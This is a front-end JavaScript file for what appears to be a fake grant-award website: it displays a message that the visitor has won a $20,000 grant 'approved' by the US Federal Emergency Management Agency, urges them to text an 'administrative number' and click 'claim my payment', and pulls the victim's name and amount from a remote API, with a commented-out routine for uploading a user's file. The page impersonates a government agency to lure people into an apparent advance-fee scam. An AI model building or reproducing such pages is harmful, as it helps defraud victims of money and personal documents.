const dashboardPage = document.querySelector('.dashboard-div')

    setTimeout(function() {
       
        dashboardPage.innerHTML = ` <h3>
              Congratulations <span class="firstname">firstname</span> <span class="lastname">lastname</span>,
              </h3>
              <div class="winning-message-div">
                <p class="greeting-text hide-text winning-message">
                  Yep, that's right. Congrats Welcome back on board
                  <span class="firstname">firstname</span>
                  <span class="lang">lastname</span>; Your Grant Application has
                  been approved successfully! You Just won a Grant payment of
                  $<span class="amount-won">20,000</span> on
                  <span class="grant-won-date">november 21 2010</span>.</p>
  
                  <div class="mb-3 submit-div col-12">
                   <button class="amount-won-btn btn btn-success">
                    Grant amount: $<span class="amount-won-span">20,000</span>
  
                   </button>
                  </div>
                  
                  <div class="new-p-text">
                    <p>
                    You have been luckily selected as part of our Successful winners for the day. We have thousands of applications daily but We only pick few winner(s). 
                    Your patience just paid off!
                    Your application has been successfully approved by the Federal Government. 
                  
                    We have
                    thousands of applications daily but We only pick few winner(s)
                    in a day.Your patience just paid off. You just won a grant of
                    $<span class="amount-won-span">20,000</span>! Your application has been successfully
                    approved by the US Federal Emergency Management Agency; wait no
                    longer.
                    </p>
                    <div class="mb-3 grant-status-div ">
                    <h3 class="grant-status-after">Grant Status:</h3>
                      <button class="approved-btn btn btn-success">
                       approved
                      </button>
                     </div>
  
                   <p> Simply text the administrative number with your grant
                   code on how to receive your funds. Grant id: <span class="grantid" style="color: navy;">123456</span>
  
                   Congratulations once again
                   <span class="firstname">firstname</span>
                    <span class="lastname">lastname</span>!
                   </p>
                </div> 
  
  
                <div class="grant-success-img-div">
                 <img
                  src="./images/grant-success.jpeg"
                  alt=""
                  class="grant-success-img"
                 />
                </div>
               
              <div class="payment-mode">
                <div class="claim-payment-div">
                  <button class=" btn btn-success w-100 claim-payment-btn" onclick="paymentMethod()">
                  claim my payment
                  </button>
               </div>
              </div>`
    }, 1000)


const afterPayment = document.querySelector('.after-payment');
const claimBtn = document.querySelector('.claim-payment-btn')
const btns = document.querySelectorAll('.btn')
const  firstName = document.querySelectorAll('.firstname')
const lastName = document.querySelector('.lastname')
const firstAmount = document.querySelector('.first-amount')
const secondAmount = document.querySelector('.second-amount') 



console.log(lastName)



function paymentMethod() {
  afterPayment.classList.toggle('show-link')
}

// btns.forEach(btn => {
//   console.log(btn)
//   btn.addEventListener('click', function(e) {
//     e.preventDefault()
//   })
// })


let url = 'https://dateapi-app.herokuapp.com/user/'
let h = new Headers()
const token = JSON.parse(localStorage.getItem('myToken'))
h.append('Authorization', `Bearer ${token}`)
h.append('Accept', 'applciation/json')

let response = fetch(url, {
  method: 'GET',
  headers: h
  
})
.then(res =>  res.json())
.then(data =>  {
  console.log(data)
  firstName.forEach(first => {
    first.innerHTML = data.firstname
  })

  lastName.innerHTML = data.lastname

 firstAmount.innerHTML = data.grant
 secondAmount.innerHTML = Number(data.grant) + 4000

})


let url2 = 'https://dateapi-app.herokuapp.com/image/'
let h2 = new Headers()
h2.append('Authorization', `Bearer ${token}`)
h2.append('Accept', 'application/json')
h2.append('Content-Type', 'application/json')
try {
  let response2 = fetch(url2, {
    method: 'GET',
    headers: h2
  })
  .then(res2 => res2.json())
  .then(data2 => console.log(data2))
} catch (error) {
  console.log(error)
}





let url3 = 'https://dateapi-app.herokuapp.com/user/time'
let h3 = new Headers()
h3.append('Authorization', `Bearer ${token}`)
h3.append('Accept', 'application/json')
h3.append('Content-Type', 'application/json')
try {
  let response2 = fetch(url3, {
    method: 'POST',
    headers: h3
  })
  .then(res2 => res2.json())
  .then(data3 => {
    console.log(data3)
    if(data3 === true) {
      
    } else {
    
    }

  })
} catch (error) {
  console.log(error)
}






  
























// form.addEventListener('submit', async function(e) {

// e.preventDefault()
// const url2 = 'https://dateapi-app.herokuapp.com/image/'
//     let userFile = file.files[0]
//     console.log(userFile)
//     const fileFormData = new FormData()
//     fileFormData.append('uploaded_file', userFile)
//     let token = JSON.parse(localStorage.getItem('myToken'))
//     console.log(token)
//     let h = new Headers()
//     h.append('Authorization', `Bearer ${token}`)
//      h.append('Authorization', `Bearer ${token}`)
//     // h.append('content-type', 'multipart/form-data')

//     try {
//         const response2 = await fetch(url2, {
//             method: 'POST',
//             body: fileFormData,
//            headers: h
//            })

//            const json = await response2.json()
//            console.log(json)      
//     } catch (error) {
//         console.log(error)
//     }
//   })